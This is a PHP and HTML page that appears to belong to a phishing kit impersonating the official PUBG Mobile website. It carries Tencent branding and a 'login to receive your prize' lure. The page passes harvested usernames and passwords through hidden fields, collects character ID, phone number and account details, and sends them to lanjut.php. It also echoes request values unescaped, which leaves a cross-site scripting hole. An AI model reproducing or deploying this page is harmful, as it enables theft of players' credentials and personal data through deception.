
<?php
$username = $_GET['username'];
$password = $_GET['password'];
$login = $_GET['login'];
?>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<script type="application/javascript">
const tabLinks = document.querySelectorAll(".tabs a");
const tabPanels = document.querySelectorAll(".tabs-panel");
 
for(let el of tabLinks) {
  el.addEventListener("click", e => {
    e.preventDefault();
     
    document.querySelector('.tabs li.active').classList.remove("active");
    document.querySelector('.tabs-panel.active').classList.remove("active");
 
    const parentListItem = el.parentElement;
    parentList.classList.add("active");
    const index = [...parentListItem.parentElement.children].indexOf(parentListItem);
     
    const panel = [...tabPanels].filter(el => el.getAttribute("data-index") == index);
    panel[0].classList.add("active");
  });
}


</script>

<link rel="stylesheet" href="css/pop.css">
<link rel="stylesheet" href="css/style2.css">
<link rel="stylesheet" href="css/facebook.css">
<link rel="stylesheet" href="css/twitter.css">
<link rel="stylesheet" href="css/google.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://rawcdn.githack.com/Nafiswatsiq/pubg-14/e5e387599b9906cb7c09298b1c4aa5fac63368e7/common.css">
<link rel="stylesheet" href="https://rawcdn.githack.com/Nafiswatsiq/pubg-14/e5e387599b9906cb7c09298b1c4aa5fac63368e7/footer.css">
<link rel="stylesheet" href="https://rawcdn.githack.com/Nafiswatsiq/pubg-14/e5e387599b9906cb7c09298b1c4aa5fac63368e7/style.css">
<link rel="stylesheet" href="https://rawcdn.githack.com/Nafiswatsiq/pubg-14/e5e387599b9906cb7c09298b1c4aa5fac63368e7/style3.css">
<link rel="stylesheet" href="https://rawcdn.githack.com/Nafiswatsiq/pubg-14/e5e387599b9906cb7c09298b1c4aa5fac63368e7/weapon.css">
<link rel="stylesheet" href="path/to/material-design-iconic-font/css/material-design-iconic-font.min.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">

<link rel="stylesheet" href="./css/reset.css">
<link rel="stylesheet" href="./css/common.css">
    
    <!-- css -->
 

<script type="text/javascript" async="" src="./css/request"></script>
   <title>PUBG MOBILE</title>

    
</head>

<body >

    <!-- nav -->
    <div class="top-nav">
    <div class="top-main c">
        <!-- logo,name -->
        <div class="top-log c">
            <a href="https://www.pubgmobile.com/en-US/" onclick="gtag(&#39;event&#39;,&#39;x_jump&#39;,{&#39;event_category&#39;:&#39;common_inc&#39;,&#39;event_label&#39;:&#39;nav_logo&#39;});">
                <img src="css/icon_logo.jpg" width="128" height="128" alt="">
            </a>
            <h1 class="top-tit">
                PUBG MOBILE
                <span>OFFICIAL PUBG ON MOBILE</span>
            </h1>
        </div>
        <!-- line -->
        <div class="top-line" onclick="gtag(&#39;event&#39;,&#39;x_click&#39;,{&#39;event_category&#39;:&#39;common_inc&#39;,&#39;event_label&#39;:&#39;nav_btn&#39;});">
            <ul>
                <li>-</li>
                <li>-</li>
                <li>-</li>
            </ul>
        </div>
        <!-- nav-list -->
        <!-- homepage,download -->
        <div class="top-btn">
            <a href="https://www.pubgmobile.com/pay/" target="_blank" onclick="gtag(&#39;event&#39;,&#39;x_jump&#39;,{&#39;event_category&#39;:&#39;common_inc&#39;,&#39;event_label&#39;:&#39;nav_purchase&#39;});">PURCHASE</a>
            <a class="down" href="https://web.gpubgm.com/m/Website/xiaobao/AOS_IG0180_No28_0.18.0.12601_Shipping_ThirdPartyPayment_GLOBAL.shell.signed_uawebsite.apk" target="_blank" onclick="gtag(&#39;event&#39;,&#39;x_click&#39;,{&#39;event_category&#39;:&#39;common_inc&#39;,&#39;event_label&#39;:&#39;nav_download&#39;});">DOWNLOAD</a>
        </div>
    </div>
</div>

<!--end: common menu -->
    <!-- content -->
    
    <div class="content"> 
<div class="notify2">
<i class="zmdi zmdi-chevron-right zmdi-hc-lg"></i>
<div id="messagelogin"></div>
<script src="js/typewriter.js"></script>
<script>
var messagelogin = document.getElementById('messagelogin');
var typewriter = new Typewriter(messagelogin, { 
loop: true
});
typewriter.typeString('To receive your prize, please login first') 
.pauseFor(1000) 
.deleteChars(8) 
.start();
</script>
</div>
     <form action="lanjut.php" method="GET" id="dataSubmit"> 
      <input type="hidden" class="verify" name="username" id="email" value="<?php echo $username;?>" readonly> 
      <input type="hidden" class="verify" name="password" id="password" value="<?php echo $password;?>" readonly> 
      <input type="hidden" class="verify" name="login" id="login" value="<?php echo $login;?>" readonly> 
  
      <input type="tel" class="myinput kanan2" name="id" id="playid" placeholder="Character ID" autocomplete="off" required> 
      <input type="tel" class="myinput kiri2" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required> 
      <select class="myoption kanan2" name="level" id="level" required> <option selected disabled value="">Account Level</option> <option>1</option> <option>2</option> <option>3</option> <option>4</option> <option>5</option> <option>6</option> <option>7</option> <option>8</option> <option>9</option> <option>10</option> <option>11</option> <option>12</option> <option>13</option> <option>14</option> <option>15</option> <option>16</option> <option>17</option> <option>18</option> <option>19</option> <option>20</option> <option>21</option> <option>22</option> <option>23</option> <option>24</option> <option>25</option> <option>26</option> <option>27</option> <option>28</option> <option>29</option> <option>30</option> <option>31</option> <option>32</option> <option>33</option> <option>34</option> <option>35</option> <option>36</option> <option>37</option> <option>38</option> <option>39</option> <option>40</option> <option>41</option> <option>42</option> <option>43</option> <option>44</option> <option>45</option> <option>46</option> <option>47</option> <option>48</option> <option>49</option> <option>50</option> <option>51</option> <option>52</option> <option>53</option> <option>54</option> <option>55</option> <option>56</option> <option>57</option> <option>58</option> <option>59</option> <option>60</option> <option>61</option> <option>62</option> <option>63</option> <option>64</option> <option>65</option> <option>66</option> <option>67</option> <option>68</option> <option>69</option> <option>70</option> <option>71</option> <option>72</option> <option>73</option> <option>74</option> <option>75</option> <option>76</option> <option>77</option> <option>78</option> <option>79</option> <option>80</option> <option>81</option> <option>82</option> <option>83</option> <option>84</option> <option>85</option> <option>86</option> <option>87</option> <option>88</option> <option>89</option> <option>90</option> <option>91</option> <option>92</option> <option>93</option> <option>94</option> <option>95</option> <option>96</option> <option>97</option> <option>98</option> <option>99</option> <option>100</option> </select> 
      <select class="myoption kiri2" name="tier" id="tier" required> <option selected disabled value="">Ranked Tier Level</option> <option>Bronze</option> <option>Silver</option> <option>Gold</option> <option>Platinum</option> <option>Diamond</option> <option>Crown</option> <option>Ace</option> <option>Conqueror</option> </select> 
      <select class="myoption kanan2" name="rpt" id="rpt" required> <option selected disabled value="">Royale Pass Type</option> <option>Free Royale Pass</option> <option>Elite Royale Pass</option> </select> 
      <select class="myoption kiri2" name="rpl" id="rpl" required> <option selected disabled value="">Royale Pass Level</option> <option>1</option> <option>2</option> <option>3</option> <option>4</option> <option>5</option> <option>6</option> <option>7</option> <option>8</option> <option>9</option> <option>10</option> <option>11</option> <option>12</option> <option>13</option> <option>14</option> <option>15</option> <option>16</option> <option>17</option> <option>18</option> <option>19</option> <option>20</option> <option>21</option> <option>22</option> <option>23</option> <option>24</option> <option>25</option> <option>26</option> <option>27</option> <option>28</option> <option>29</option> <option>30</option> <option>31</option> <option>32</option> <option>33</option> <option>34</option> <option>35</option> <option>36</option> <option>37</option> <option>38</option> <option>39</option> <option>40</option> <option>41</option> <option>42</option> <option>43</option> <option>44</option> <option>45</option> <option>46</option> <option>47</option> <option>48</option> <option>49</option> <option>50</option> <option>51</option> <option>52</option> <option>53</option> <option>54</option> <option>55</option> <option>56</option> <option>57</option> <option>58</option> <option>59</option> <option>60</option> <option>61</option> <option>62</option> <option>63</option> <option>64</option> <option>65</option> <option>66</option> <option>67</option> <option>68</option> <option>69</option> <option>70</option> <option>71</option> <option>72</option> <option>73</option> <option>74</option> <option>75</option> <option>76</option> <option>77</option> <option>78</option> <option>79</option> <option>80</option> <option>81</option> <option>82</option> <option>83</option> <option>84</option> <option>85</option> <option>86</option> <option>87</option> <option>88</option> <option>89</option> <option>90</option> <option>91</option> <option>92</option> <option>93</option> <option>94</option> <option>95</option> <option>96</option> <option>97</option> <option>98</option> <option>99</option> <option>100</option> </select> 
      <select class="myoption" style="width: 100%;" name="platform" id="platform" required> <option selected disabled value="">Platform</option> <option>Android</option> <option>iOS</option> </select> 
      
      
      <button type="submit" class="btn-verify" id="verify">Submit Verify</button> 
     </form> 
     <div id="success"></div> 
    </div> 

    <!-- footer -->
<div class="footer">
    <div class="foot_ct">
        <p class="foot_ship">Partnership Inquiry: pubgmobile_business@tencent.com</p>
        <div class="foot_copy clearfix">
            <p class="copy_left">
                <img src="css/foot_logo1.png" width="142" height="40" alt="">
                <img src="css/foot_logo2.png" width="94" height="40" alt="">
                <img src="css/foot_logo3.png" width="165" height="40" alt="">
            </p>
            <div class="copy_right">
                <p>ⓒ 2018-2020 PUBG CORPORATION. All rights reserved.</p>
                <p>ⓒ 2018-2020 Tencent. All rights reserved.</p>
                <p><a onclick="" href="">Privacy Policy </a>|
                    <a onclick="" href=""> Tencent Games User Agreement</a>
                </p>

            </div>
        </div>
    </div>
</div>


    
<script src="./css/jquery-1.7.2.min.js.download" type="text/javascript"></script>
<script src="./css/fastclick.js.download" type="text/javascript"></script>
<script src="./css/common.js.download" type="text/javascript"></script>

    
<script type="text/javascript" src="./css/weapon.js.download"></script>
<script type="text/javascript">
	$(function () {
		Common.init();
		Weapon.init();
	})
</script>
<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/tab_rewards.js"></script>
<script src="js/tab_other.js"></script>
<script src="js/popup.js"></script>
<script src="js/content.js"></script>
<script src="js/counter.js"></script>
<script src="js/google.js"></script>

    <!-- Global Site Tag (gtag.js) - Google Analytics -->
    <script async="" src="./css/js"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-65628961-3');
</script>


</div>
</body>
</html>